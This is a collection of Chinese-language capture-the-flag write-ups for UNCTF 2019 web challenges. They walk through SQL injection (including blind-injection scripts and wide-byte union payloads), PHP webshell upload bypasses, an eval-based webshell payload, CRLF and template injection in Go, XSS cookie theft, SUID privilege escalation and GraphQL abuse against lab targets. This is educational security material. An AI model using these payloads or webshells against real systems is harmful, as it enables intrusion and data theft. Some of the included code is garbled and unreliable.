![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/62430ec7e0f066682ff42799ad7d450c.png)

1.  用用户名 admin，密码 123456登录得到 flag。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/f717a68777d9e712337881febca5e0b7.png)

### Simple_Calc_1
#### 原理知识
1）	由于网站开发者在进行代码编写过程中未对输入参数进行严格校验及过滤，导致黑客可以通过构造SQL语句，获取目标网站后台数据库中的信息。
2）	SQL注入是输入特定的SQL语句达到SQL注入的效果，不同类型的SQL数据库类型所对应的SQL语句不一样，因此，尝试SQL注入测试前，需要获取目标网站数据库类型，通常，根据测试者的测试经验或采用不同数据库类型的测试的方法进行测试，有效获得目标网站真实数据库类型。
3）	如果网站在反向代理之后，获取客户端真实 IP 的方式就是获取 X-Forwared-For 等包含客户端真实 IP 的头，但如果要是不加检验直接获取往往会存在问题。

#### 解题过程
步骤：

1.  打开靶机，是这样一个计算器。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_1/d27df2668ae27f27a063d6b987cd7018.png)

1.  看下关于信息，这里有个次数显示。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_1/b0b573d84cafd0675faa1070b8c7bb7b.png)

1.  F12 看下，发现有个 backend 请求。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_1/464c5d083501cddef7761c9df433e87b.png)

1.  然后尝试构造 X-Forwarded-For 来伪造访客 IP，发现是可以伪造成功的。

127.0.0.1:

第一次访问：

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_1/91490e16b7ed10fc5394c244a21d5a97.png)

第二次访问：

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_1/c8fbb6689ccf4b1439f9d037e734ef02.png)

127.0.0.3：

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_1/06a6794a07376e5491a451c649cc6019.png)

1.  然后就可以尝试在这里尝试注入了。

>   多番测试之后，发现伪造 IP 为 127.0.0.3 ‘ or ‘1’=’1
>   之后，功能正常，说明此处有注入点。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_1/8b4f51e94030252d3a8e2415370a4654.png)

1.  所以我们就可以直接用sqlmap来跑出数据了，当然 flag 也可以直接拿到了。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_1/385f153ee5a1b029f6d869394de7a6f2.png)


### Simple_Calc_2
#### 原理知识
1）	由于开发者直接将参数作为后端命令执行时的变量传入，导致了命令执行。
2）	SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。通过此即可调用特定的应用程序来提权。

#### 解题过程
步骤：

1.  打开靶机，是这样一个计算器。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_2/d27df2668ae27f27a063d6b987cd7018.png)

1.  F12打开，然后随意点一下计算器看看，比如算一下 1+1 = 2。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_2/d3ec05886d5116299eac0bf1ada10431.png)

1.  网络请求看下，发现有个 calc.php请求。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_2/605bd5433b8f228a95a7449ce6d54f0f.png)

1.  来自己构造一个包试试能不能 rce。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_2/4450618a5f45d02b5ff45e794d1512d5.png)

1.  可以，那么就可以直接读flag.txt 试试。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_2/31695ba4e196bacc9185f4ace39d4453.png)

1.  不能读，来看看 flag.txt 的权限。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_2/91f7315da61b3f8645d4bdec37eab935.png)

1.  得找个带 suid 的可执行文件来读，来搜一下有哪些文件可用。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_2/f3cdf1947bfc6ecb9cb44d66b80f2cfd.png)

1.  tac 可用，那就直接用这个来读吧。Flag 到手\~

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_2/340b7abb62126571f7e88534a3d78e1b.png)

### simple_upload
#### 解题过程
步骤：

1.  打开靶机，就会出现源码

![](https://ctfwp.wetolink.com/2019unctf/simple_upload/4a6d8492a31e140bdb81c9a604d25296.png)

1.  分析功能后,我们需要上传一个webshell到服务器上

![](https://ctfwp.wetolink.com/2019unctf/simple_upload/eb036fe029f933aa57fad2d509dd833e.png)

1.  题目考点可以从源码中看到,首先是mime的类型检测

我们使用burp 获取中间的包进行修改即可绕过检测

![](https://ctfwp.wetolink.com/2019unctf/simple_upload/806efed796ccc38c2f057929a640f1ee.png)

1.  但是这样会有hacker的提示,可以看到源码中,对上传文件的内容进行了检测,对于此我们可以采用\<script\>这种标胶进行绕过(因为实验环境是在php
    5.6下进行的)

![](https://ctfwp.wetolink.com/2019unctf/simple_upload/f8c565d0a43088e0e275918b8eb3dc4a.png)

![](https://ctfwp.wetolink.com/2019unctf/simple_upload/b8ae496a19ec81796e8735d8afd78d76.png)

1.  可以看到已经绕过了\<?标记检测

![](https://ctfwp.wetolink.com/2019unctf/simple_upload/5f09106c5dbb63f244227a2e3c32dc17.png)

1.  这里又会遇到一个问题就是我们不能让他保存为php的后缀,

![](https://ctfwp.wetolink.com/2019unctf/simple_upload/68c8683a8ee8e4c278875caa69d34d3e.png)

1.  所以回到源码中发现他以数组的形式(这一句话\$file_name = reset(\$file) . '.' .
    \$file[count(\$file) -
    1];)进行判断,且最后以move_uploaded_file函数进行上传.我们应该知道这个函数会递归删除文件最后的/.字符串(例如1.php/.会被转化为1.php,而且是递归的),所以我们的思路就清楚了因为file_name
    等于reset(\$file)加一个. 和\$file[count(\$file) -
    1]组成的,所以我们让reset(\$file)为xxx.php/,再让\$file[count(\$file) -
    1]为空,这样我们的文件名就能组成为xxx.php/.最后会删除/.所以就能保存为php格式了

2.  再bp中按照这样输入,就可以发现上传成功了

![](https://ctfwp.wetolink.com/2019unctf/simple_upload/f8a9d7ec635ec6b81c67ccea43b79703.png)

1.  然后访问上传的文件就可以

![](https://ctfwp.wetolink.com/2019unctf/simple_upload/95c4e6217e0b04d524856002c667aac9.png)

1.  使用木马,post请求即可得到flag

![](https://ctfwp.wetolink.com/2019unctf/simple_upload/560dac94e98c14260d782c538b93dfcb.png)


### simple_web
#### 原理知识
1）	Php的webshell的基础知识,就是eval函数将得到的字符串当作了命令处理了
2）	简单的命令注入

#### 解题过程
步骤：

1.  打开靶机，出现这样一个页面

![](https://ctfwp.wetolink.com/2019unctf/simple_web/06bfb8dbc0aaf5eff525aa62328f0910.png)

1.  根据提示后,考虑存在robots.txt文件

2.  访问robots.txt出现一下内容

![](https://ctfwp.wetolink.com/2019unctf/simple_web/cd05e8f54491ee8ca9509894d171aa29.png)

1.  继续访问getsandbox.php,得到一下内容.

![](https://ctfwp.wetolink.com/2019unctf/simple_web/48b6ece7dfa4a83424b1ac39b7f3c1c8.png)

1.  了解大意后,发现是一个得到了一个沙盒,然后发送get请求reset=1就能重置沙盒

2.  接着访问属于自己的沙盒,发现如下代码

![](https://ctfwp.wetolink.com/2019unctf/simple_web/8c3da3873abb68f4f4aaa0b730b92af5.png)

1.  审计之后,发现会写入一个content.php的文件内,但是我们输入的字符都会被addslashes添加转义,从而保证安全

2.  规则大概如下‘-\>/’,/-\>//,所以我们需要采用特别的构造技巧,payload如下:?content=aaa\\';\@eval(\$_POST[x]);;//

3.  如此构造后我们content.php的内容就会变为如下的内容

![](https://ctfwp.wetolink.com/2019unctf/simple_web/8f2731c0e33de2dbb00d90bab6570ee7.png)

10 .使用菜刀链接,从而就在根目录下能得到flag

![](https://ctfwp.wetolink.com/2019unctf/simple_web/6027f5ba2089f795536a0e73e19facf2.png)

### smile doge
#### 原理知识
1） CRLF 注入漏洞， 是因为 Web 应用没有对用户输入做严格验证， 导致攻击者可以输入一些恶意字符。 攻击者一旦
向请求行或首部中的字段注入恶意的 CRLF， 就能注入一些首部字段或报文主体， 并在响应中输出， 所以又称为
HTTP 响应拆分漏洞（HTTP Response Splitting） 。
2） SSTI 和常见 Web 注入(SQL 注入等)的成因一样， 也是服务端接收了用户的输入， 将其作为 Web 应用模板内容的
一部分， 在进行目标编译渲染的过程中， 执行了用户插入的恶意内容。

#### 解题过程
1） 打开浏览器， 访问目标主机， 可以看到页面只有一个输入框， 简单测试可以看到输入的内容基本都原样输出了，
且默认页面输出为“Hello gugugu!” ， 输入“http://127.0.0.1” 后发现输出的内容为“Hello Hello gugugu!!” 
可以看到内容发生了嵌套， 说明可能存在 SSRF

![](http://yanxuan.nosdn.127.net/cc1ace6f4d5ec7ea66a91c7455b19f19.png)

2） 页面提示代号 9527， 于是输入“http://127.0.0.1:9527/” ， 发现同样出现了内容嵌套， 且内容为“Hello
No.9527!” ， 可以判断出内网中 9527 端口存在一个服务

![](https://ctfwp.wetolink.com/2019unctf/Smile_Dog/1.png)

3） 用 Dirsearch 等工具能够很轻易地扫到备份文件： http://127.0.0.1/backup/.index.php.swp

![](https://ctfwp.wetolink.com/2019unctf/Smile_Dog/2.png)

下载下来用 vim -r .index.php.swp 恢复源码

![](https://ctfwp.wetolink.com/2019unctf/Smile_Dog/3.png)

4） 稍微搜一下能发现代码是 Golang 的， 首先可以看出 flag 是放在*http.Request 的 Header 中的， 结合 9527 端口
的回显是“Hello No.9527!” ， 可以得出 name 参数的值即为输出的值， 当请求的 Header 中含有“Logic” 头时， name
的值即为“Logic” 头的值， 但是 SSRF 在一般情况下是无法控制服务器发出请求中的 Header 的， 此时就要考虑如何
控制 SSRF 中的 Header， 即 CRLF 注入， 这里实际用的是 CVE-2019-9741。 构造 Payload： “http://127.0.0.1:9527/?
HTTP/1.1\r\nLogic: abc”

![](https://ctfwp.wetolink.com/2019unctf/Smile_Dog/4.png)

5） 在 Go 的模板中， 要插入一个对象的值， 则使用`{{.对象名}}`， 回忆之前的源码泄露， flag 是放在*http.Request
中的， 在结构体中可以看到*http.Request 的名为 MyRequest， 所以模板注入的 Payload 为`{{.MyRequest}}`， 完整的
Payload：
`“http://127.0.0.1:9527/? HTTP/1.1\r\nLogic: {{.MyRequest}}”`

![](https://ctfwp.wetolink.com/2019unctf/Smile_Dog/5.png)

### superwaf
#### 原理知识
1）	XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。
#### 解题过程
1.  打开浏览器，访问目标主机，可以看到界面如下图1所示：

![](https://ctfwp.wetolink.com/2019unctf/superwaf/036f99acf68475163a6e53b6db10216d.png)

图1 web界面

1.  每次提交payload需要提交MD5校验码，编写脚本爆破，脚本如下图2所示：

![](https://ctfwp.wetolink.com/2019unctf/superwaf/e9c99000cfc61be52802c83eee8e83db.png)

图2 爆破脚本

1.  绕过waf的思路是bypass xss/csp \<frameset onpageshow =
    ，扫描下目录容易发现Admin
    dir的路径为/admin/admin.php，使用exp脚本生成的payload如下图3所示，具体细节部分在exp文件夹下的exp.py文件中：

![](https://ctfwp.wetolink.com/2019unctf/superwaf/c0729be3a38a45c1026b73003b6ff325.png)

图3 生成payload

1.  最后在vps上获取到admin的cookie，也就是flag，如下图4所示，或者也可以使用xss平台。

![](https://ctfwp.wetolink.com/2019unctf/superwaf/e3737b14892b4bd9f5bcd731250870c9.png)

图4 获取admin cookie

### Twice_Insert
#### 原理知识
1）	由于网站开发者在进行代码编写过程中未对输入参数进行严格校验及过滤，导致黑客可以通过构造SQL语句，获取目标网站后台数据库中的信息。
2）	SQL注入是输入特定的SQL语句达到SQL注入的效果，不同类型的SQL数据库类型所对应的SQL语句不一样，因此，尝试SQL注入测试前，需要获取目标网站数据库类型，通常，根据测试者的测试经验或采用不同数据库类型的测试的方法进行测试，有效获得目标网站真实数据库类型。

#### 解题过程
1）打开浏览器，访问目标主机，打开页面发现是sqli-labs-24关，原题是利用二次注入修改admin密码，这题修改admin密码却没有flag，要想拿到flag可能需要爆库。

2）根据题意，尝试布尔盲注

发现or被过滤

先注册一个用户，比如scl 1

然后注册 scl’and 1# 1

![](https://ctfwp.wetolink.com/2019unctf/Twice_Insert/15a739fa68845245743232b7c1eb9a25.png)

修改为0，

![](https://ctfwp.wetolink.com/2019unctf/Twice_Insert/072c4deede2956efe572d617b5530384.png)

需要将scl的密码重置为1

然后注册 scl’and 0# 1

登录修改密码

![](https://ctfwp.wetolink.com/2019unctf/Twice_Insert/4c28fdd6978b187d78ccb4e3a1dab41f.png)

提示

![](https://ctfwp.wetolink.com/2019unctf/Twice_Insert/83935b512a19b991f90f6be4add3eace.png)

说明更新失败，可以布尔盲注

1.  写个脚本

```
#
coding = utf - 8
import requests
url = "http://127.0.0.1/sqli/Less-24/login_create.php"
url1 = "http://127.0.0.1/sqli/Less-24/login.php"
url2 = "http://127.0.0.1/sqli/Less-24/pass_change.php"
#
将密码改回1
def change21():
    user = "scl"
    s = requests.session()
    data = {
        "login_user": user,
        "login_password": '0',
        "mysubmit": "Login"
    }
    r = s.post(url1, data)
    data = {
        "current_password": '0',
        "password": '1',
        "re_password": '1',
        "submit": 'Reset'
    }
    r = s.post(url2, data)

def second():
    flag = ""
    tmp = 1
    for i in range(1, 50):
        if tmp == 0:
        break
    tmp = 0
    for j in range(32, 127):
        s = requests.session()
    user = "scl'and ascii(substr((select database())," + str(i) + ",1))=" +
        str(j) + "#"
    print user
    # 注册用户名
    data = {
        "username": user,
        "password": '1',
        "re_password": '1',
        "submit": "Register"
    }
    r = s.post(url, data)
    # 登录用户
    data = {
        "login_user": user,
        "login_password": '1',
        "mysubmit": "Login"
    }
    r = s.post(url1, data)
    # print r.content.decode()
    if "YOU ARE LOGGED IN AS" in r.content.decode():
        print "login ok"
    #
    更改密码
    data = {
        "current_password": '1',
        "password": '0',
        "re_password": '0',
        "submit": 'Reset'
    }
    r = s.post(url2, data)
    if "successfully updated" in r.content.decode():
        flag += chr(j)
    tmp = 1
    print "change ok"
    change21()
    break
    print flag
second()
```

### WEB1
#### 原理知识
1）	网站编写过程中一般都会留下一个备份文件，该文件就是网站的源码
2）	Get在url中传递参数，而post需要利用插件或工具传递参数

#### 解题过程
1.  访问*www.zip*，自动下载了一个压缩包，

![](https://ctfwp.wetolink.com/2019unctf/WEB1/1d8cf0cc7d45d09ce7f325b96812842a.png)

>   发现是备份文件，打开获得源码

2）

![](https://ctfwp.wetolink.com/2019unctf/WEB1/ac01746aa312f20428c2dd397c7b79bc.png)

发现有两个flag，一个flag_ahead,一个flag_behind，代码审计

3)根据要求get和post传参：GET：un=0 and 1

POST：ctf[]=99999999999

![](https://ctfwp.wetolink.com/2019unctf/WEB1/0117a44d8a7012bb570efe7c924ff792.png)

4)提交flag

### WEB2
#### 原理知识
文件包含漏洞
#### 解题过程
1.  上传一个1.jpg，内容如下

2）

![](https://ctfwp.wetolink.com/2019unctf/WEB2/3bd74363271c5a249cc6f484d2fc1ed5.png)

>   得到了如下反馈：

![](https://ctfwp.wetolink.com/2019unctf/WEB2/a57a7a23d00b4a45fa9d990dce2905b9.png)

1.  知道了文件路径为uploads，因为是文件包含漏洞，尝试访问flag.php，如下图：

![](https://ctfwp.wetolink.com/2019unctf/WEB2/6f7768fab502e3521e206606bad98dbd.png)

4）使用hackbar访问1.jpg

![](https://ctfwp.wetolink.com/2019unctf/WEB2/cd62481b7de4602b5f8a6ebb042b83f4.png)

返回了GIF98，说明文件成功被包含,然后get传参，?a=ls，如下

![](https://ctfwp.wetolink.com/2019unctf/WEB2/9e3a6a1da887cba5b2e974347370f4a6.png)

访问uunnccttff，得到：

![](https://ctfwp.wetolink.com/2019unctf/WEB2/aec0815ca02c50378acc6f39d264304f.png)

得到了flag的目录，查看：

![](https://ctfwp.wetolink.com/2019unctf/WEB2/dc7959f415ef440bbde95597a316abcf.png)

得到了flag
### 阿风日记
#### 原理知识
1）	利用burp intruder组件可以很方便的使用字典进行爆破
#### 解题过程
步骤：

1.  打开靶机，出现这样一个页面

2.  可以根据日记大概猜测出博主喜欢设置弱密码

![](https://ctfwp.wetolink.com/2019unctf/afeng/2a75be6c242dc75458b1dcded32f222f.png)

1.  发现有个秘密文章需要密码访问

![](https://ctfwp.wetolink.com/2019unctf/afeng/20ad6f319e2c8f95498d53e9dc7856b1.png)

1.  抓包之后,导入intruder

![](https://ctfwp.wetolink.com/2019unctf/afeng/5dcde82bc039c1afa925974f91cf80ff.png)

>   4.清除变量,设置pass为唯一变量,

>   5.粘贴弱密码

![](https://ctfwp.wetolink.com/2019unctf/afeng/7a8c435d2821b02ceb57c4b0f2127ba1.png)

>   6.爆破,查看长度,得到flag

![](https://ctfwp.wetolink.com/2019unctf/afeng/9afc1b6119ea76ec7114a97fe811e24f.png)

### 光坂镇的小诗1
#### 原理知识
1）	由于网站开发者在进行代码编写过程中未对输入参数进行严格校验及过滤，导致黑客可以通过构造SQL语句，获取目标网站后台数据库中的信息。
2）	SQL注入是输入特定的SQL语句达到SQL注入的效果，不同类型的SQL数据库类型所对应的SQL语句不一样，因此，尝试SQL注入测试前，需要获取目标网站数据库类型，通常，根据测试者的测试经验或采用不同数据库类型的测试的方法进行测试，有效获得目标网站真实数据库类型。
3）	如果网站在反向代理之后，获取客户端真实 IP 的方式就是获取 X-Forwared-For 等包含客户端真实 IP 的头，但如果要是不加检验直接获取往往会存在问题。

#### 解题过程
步骤：

1.  打开靶机，是这样一个诗句。

![](https://ctfwp.wetolink.com/2019unctf/poetry1/461f19be6f216920976681e519c61a4a.png)

1.  再四处查看信息过后,可以发现每一个链接都是一个get的请求,只是数字不同而已

![](https://ctfwp.wetolink.com/2019unctf/poetry1/05f123e304c9cf594c1e7480767df862.png)

1.  此外还有一个输入的内容提示,

![](https://ctfwp.wetolink.com/2019unctf/poetry1/ef0b300788c1f28df2b4c2d2cb66996c.png)

1.  尝试sql注入报错,输入’字符,发现输入提示变为了如下

![](https://ctfwp.wetolink.com/2019unctf/poetry1/e88983a71e6d706e7bfa3e14b59d9e8f.png)

1.  可以发现被转化了,本题考点是宽字节注入,考虑新生水平,所以将输入转化的内容直接提示出来了,这样很方便构造,所以我们可以按照输入构造sql语句,payload如下

2.  先看本数据库的表有那些,( -1%df%27union%20select%20(select
    group_concat(table_name) from information_schema.tables where
    table_schema=database()),2%20%23)

![](https://ctfwp.wetolink.com/2019unctf/poetry1/acd161badbee1b8f5943fd04c54b81bc.png)

1.  可以看到有个flag,和img表,接下来直接读取flag的内容,payload如下,(
    -1%df%27union%20select%20(select%20\*%20from%20flag%20limit%200,1),2%20%23)

2.  Flag出来了

![](https://ctfwp.wetolink.com/2019unctf/poetry1/a1308c2747d8e3b723e43bc5fff204d7.png)

### 光坂镇的小诗2
#### 原理知识
1）	由于网站开发者在进行代码编写过程中未对输入参数进行严格校验及过滤，导致黑客可以通过构造SQL语句，获取目标网站后台数据库中的信息。
2）	SQL注入是输入特定的SQL语句达到SQL注入的效果，不同类型的SQL数据库类型所对应的SQL语句不一样，因此，尝试SQL注入测试前，需要获取目标网站数据库类型，通常，根据测试者的测试经验或采用不同数据库类型的测试的方法进行测试，有效获得目标网站真实数据库类型。

#### 解题过程
步骤：

1.  打开靶机， 留着一些诗

![](https://ctfwp.wetolink.com/2019unctf/poetry2/e0a3bf881355f24f02c29365011ddd9c.png)

1.  可以看到每一个链接都是发送了一个get请求,

![](https://ctfwp.wetolink.com/2019unctf/poetry2/053a899f3abee34a470191ed4487364c.png)

1.  可以大体判断出是get id然后,数据库返回id的图片的地址

2.  但是题目信息只提示了他再数据库中,如果get
    id的数字超过了6就没有提示了,于是尝试sql注入,再地址栏提交1’网页没有提示,但是提交1’%23则有提示了,所以判断出了是考察的布尔盲注,并且没有过滤.

![](https://ctfwp.wetolink.com/2019unctf/poetry2/6d811e297599e170be14e515d8c1dffd.png)

![](https://ctfwp.wetolink.com/2019unctf/poetry2/515010b75b4716538b8320eebfc08d4f.png)

1.  编写python脚本,在exp中

>   ?id=1' and length(database())='{}' %23 判断数据库长度

>   ?id=1' and substr(database(),{0},1)='{1}' %23爆破数据库名

>   id=1' and (substr((select group_concat(table_name) from
>   information_schema.tables where table_schema='ctf'),{0},1))='{1}' %23爆破表

>   最后再flag表中flag字段得到了flag

1.  拿到flag

![](https://ctfwp.wetolink.com/2019unctf/poetry2/082f17708bacf56725f305f0f229fa1c.png)

### 加密的备忘录
#### 原理知识
1) GraphQL可以使用不同的查询，返回不同的结果集合
base64编码把8字节字符分割为6字节字符，然后去查表，构造出  
2) base64字符串。这里提供了加密后的密文，只要控制加密前的6位，就可以获取
到base64编码表。
#### 解题过程
打开首页，只有一个简单界面,如图1:

![](https://ctfwp.wetolink.com/2019unctf/book1/1.png)

图1 默认主页面

没有发现有用的地方，查看源码，从注释中发现与GraphQL相关，访问GraphQL默认页面，返回错误消息，如图2：

![](https://ctfwp.wetolink.com/2019unctf/book1/2.png)

图2 访问graphql查询地址返回结果

可以看到没有提供GraphQL的图形化查询界面,使用浏览器插件Altair GraphQL Client即可以进行图形化的查询，如图3:

![](https://ctfwp.wetolink.com/2019unctf/book1/3.png)

图3 Altair图形化的GraphQL查询界面

使用图形化界面的优点是方便查看schema(即接口文档，这个GraphQL服务提供了什么样的接口)。

2.2 寻找漏洞点

测试GraphQL的所有功能，发现memos有一个private字段，并提供了修改功能可以修改这个字段值，构造修改查询，可以看到mid等于2可以修改成
功，如图4:

![](https://ctfwp.wetolink.com/2019unctf/book1/4.png)

图4 修改private属性为false

再查询memos，能看到多了1条记录，但是还是看不到留言内容。通过使用allUsers查询可以获得详细的memo信息，结果如图5:

![](https://ctfwp.wetolink.com/2019unctf/book1/5.png)

图5 使用allUsers查询获取留言的详细信息可以看到有

password和content字段，但两个字段的内容看上去都不对。

3.2.3 base64解密

根据主页中的注释，提示有base，并且长度为64个字符，猜测为base64加密，如图6:

![](https://ctfwp.wetolink.com/2019unctf/book1/6.png)

图6 主页源码中的注释

GraphQL中有checkPass这个查询可以使用，提供一个memo的id和密码返回检测结果,随便猜测一个密码，结果如图7:

![](https://ctfwp.wetolink.com/2019unctf/book1/7.png)

图7 checkPass查询结果

错误消息中提示了输入的密码加密后的结果。根据base64原理，可以获取到base64的转换表，具体代码如下：

```
#!/usr/bin/env python

#coding = UTF - 8
import base64
import json
import requests# 代理设置
proxy = 'http://127.0.0.1:8080'
use_proxy = False
MY_PROXY = None
if use_proxy:
    MY_PROXY = {
        'http': proxy,
        'https': proxy,
    }
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36",
    'Upgrade-Insecure-Requests': '1',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en,ja;q=0.9,zh-HK;q=0.8',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
}
my_cookie = {}
def http_req(url, data = None, method = 'GET', params = None, json =
        False, cookies = None, proxies = MY_PROXY):
    if json:
        method = 'POST'
        json = data
        data = None
    if method == 'GET':
        params = data
        data = None
    r = requests.request(method, url, headers = headers, verify = False,
        json = json, params = params, data = data, cookies = cookies, proxies = MY_PROXY)
    return r

def graph_req(url, body):
    body = {
        'query': body
    }
    r = http_req(url, data = body, json = True)
    return r.json()

url = "http://localhost:8800/graphql"

def base64_decode(base_table):
    '''
    base64的6位索引转换为字符串
    '''
    bases = ''.join(base_table)
    bytes_len = int(len(bases) / 8)
    byte_table = [bases[i * 8: (i + 1) * 8]
        for i in range(bytes_len)
    ]
    # bases2 = ''.join(byte_table)
    # if bases != bases2: 
    #print('error...')
    char_table = [int(b, 2) for b in byte_table]
    return char_table

def decode_one(tbl, idx):
    tbl = ['{0:06b}'.format(i) for i in tbl]
    rtbl = base64_decode(tbl)
    s = ''.join([chr(i) for i in rtbl])
    r = graph_req(url, '''
            query {
            checkPass(memoId: 2,
                password: "%s")
        }
        ''' % s)
    message = r['errors'][0]['message']
    print(idx, message)
    valid_code = message.split("'")[1][3]
    return valid_code# 获取base64编码表

base_tbl = []

for c in range(64):
    tbl = [0 b111111, 0 b111111, 0 b011011, c]
    valid_code = decode_one(tbl, c)
    base_tbl.append(valid_code)

# padding字符
valid_code = decode_one([0 b111111, 0 b111111, 0 b011011], -1)
base_tbl.append(valid_code)
base_tbl = ''.join(base_tbl)
    
std_b64_table =
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='

def decode(s):
    table = str.maketrans(base_tbl, std_b64_table)
    new_s = s.translate(table)
    new_s += "="
    result = base64.b64decode(bytes(new_s, 'utf-8'))
    return str(result, 'utf-8')
    
print('password:', decode('要有了产于了主方以定人方于有成以他的爱爱'))
print('flag:', decode(
    '到年种成到定过成个他成会为而时方上而到年到年以可为多为而到可对方生而以年为有到成上可我行到他的面为们方爱'))
```
```
0 '十十地的' not valid password.
1 '十十地一' not valid password.
2 '十十地是' not valid password.
3 '十十地在' not valid password.
4 '十十地不' not valid password.
5 '十十地了' not valid password.
6 '十十地有' not valid password.
7 '十十地和' not valid password.
8 '十十地人' not valid password.
9 '十十地这' not valid password.
10 '十十地中' not valid password.
11 '十十地大' not valid password.
12 '十十地为' not valid password.
13 '十十地上' not valid password.
14 '十十地个' not valid password.
15 '十十地国' not valid password.
16 '十十地我' not valid password.
17 '十十地以' not valid password.
18 '十十地要' not valid password.
19 '十十地他' not valid password.
20 '十十地时' not valid password.
21 '十十地来' not valid password.
22 '十十地用' not valid password.
23 '十十地们' not valid password.
24 '十十地生' not valid password.
25 '十十地到' not valid password.
26 '十十地作' not valid password.
27 '十十地地' not valid password.
28 '十十地于' not valid password.
29 '十十地出' not valid password.
30 '十十地就' not valid password.
31 '十十地分' not valid password.
32 '十十地对' not valid password.
33 '十十地成' not valid password.
34 '十十地会' not valid password.
35 '十十地可' not valid password.
36 '十十地主' not valid password.
37 '十十地发' not valid password.
38 '十十地年' not valid password.
39 '十十地动' not valid password.
40 '十十地同' not valid password.
41 '十十地工' not valid password.
42 '十十地也' not valid password.
43 '十十地能' not valid password.
44 '十十地下' not valid password.
45 '十十地过' not valid password.
46 '十十地子' not valid password.
47 '十十地说' not valid password.
48 '十十地产' not valid password.
49 '十十地种' not valid password.
50 '十十地面' not valid password.
51 '十十地而' not valid password.
52 '十十地方' not valid password.
53 '十十地后' not valid password.
54 '十十地多' not valid password.
55 '十十地定' not valid password.
56 '十十地行' not valid password.
57 '十十地学' not valid password.
58 '十十地法' not valid password.
59 '十十地所' not valid password.
60 '十十地民' not valid password.
61 '十十地得' not valid password.
62 '十十地经' not valid password.
63 '十十地十' not valid password.
-1 '十十生爱' not valid password.
password: HappY4Gr4phQL
flag: flag{a98b35476ffdc3c3f84c4f0fa648e021}
```
通过获取base64编码表，实现base64算法，成功解密flag。


### 简单的备忘录
#### 原理知识
GraphQL可以提供不同的查询接口，返回不同的结果集合。主要是学习GraphQL查询语句的构造。
#### 解题过程
**目标发现**

打开首页，有一个超链接，打开后是GraphiQL的查询界面,如图1:

![](https://ctfwp.wetolink.com/2019unctf/book2/1.png)

图1 GraphiQL查询界面

漏洞寻找

通过GraphiQL的Documentation Explorer可以看到支持的查询，测试各种查询返回的结果。 通过如下查询，可以获取所有用户的所有memos信息：
```
query {
  allUsers {
     edges {
       node {
         username
            memos {
                edges {
                    node {
                        id
                        private
                        content
                        }
                    }
                }
            }
        }
    }
}
```
username查询执行结果如图2:

![](https://ctfwp.wetolink.com/2019unctf/book2/2.png)

图2 获取所有memos的查询结果

查看schema，还提供了一个UpdateMemoInfo的修改功能。
2.3 漏洞利用
通过UpdateMemoInfo修改memo的private属性,修改结果如图3:

![](https://ctfwp.wetolink.com/2019unctf/book2/3.png)

图3 修改memo id为2的记录

再使用第一次的查询，获得flag,如图4:

![](https://ctfwp.wetolink.com/2019unctf/book2/4.png)

图4 查询出flag

### 上传给小姐姐的照片
#### 原理知识
1）	由于网站开发者在进行代码编写过程无意间错误关闭vim，导致index.php文件泄露
2）	未经过滤就使parse_str函数解析变量

#### 解题过程
1.  打开浏览器，访问index.php，发现上传点

![](https://ctfwp.wetolink.com/2019unctf/img_to_girl/487dd5cb7d8bf7d0fd8d24a479f55231.png)

2）通过python脚本扫描发现.index.php.swp文件，恢复

![](https://ctfwp.wetolink.com/2019unctf/img_to_girl/0c4369f8a782f7b076b70de6a7bdc2fe.png)

1.  审计源码，发现上传为白名单限制，且parse_str函数会将url请求参数解析成变量

![](https://ctfwp.wetolink.com/2019unctf/img_to_girl/27ba64ec6765e59c37547496f2aa9ffe.png)

1.  ?filename=pic&ext_arr[]=php覆盖原白名单

![](https://ctfwp.wetolink.com/2019unctf/img_to_girl/4ead0b96a45c8816ae00ec7053fc9fda.png)

1.  上传php一句话，利用蚁剑或菜刀连接，在web根目录发现flag文件，读取获得flag

![](https://ctfwp.wetolink.com/2019unctf/img_to_girl/28eb6415aef8a513086d382ed3a0a44e.png)

### 审计一下世界上最好的语言吧
#### 原理知识
出题的思路大概就是几个综合了几个 cms的漏洞：
1.	第一个变量覆盖是灵感来自早期 dedecms 的漏洞
2.	第二个是关于bbcode的是出自最近的一个漏洞，参考：
https://www.anquanke.com/post/id/182448（中文版）
https://blog.ripstech.com/2019/mybb-stored-xss-to-rce/（这是英文版）
3.	第三个漏洞是海洋cms早期的一个getshell，参考：
https://www.freebuf.com/vuls/150042.html

#### 解题过程
首先打开网页

![](https://ctfwp.wetolink.com/2019unctf/best_language/aba703f233b6730f9f82cc61861e66bc.png)

发现 source code，点击下载源码，下载后解压。

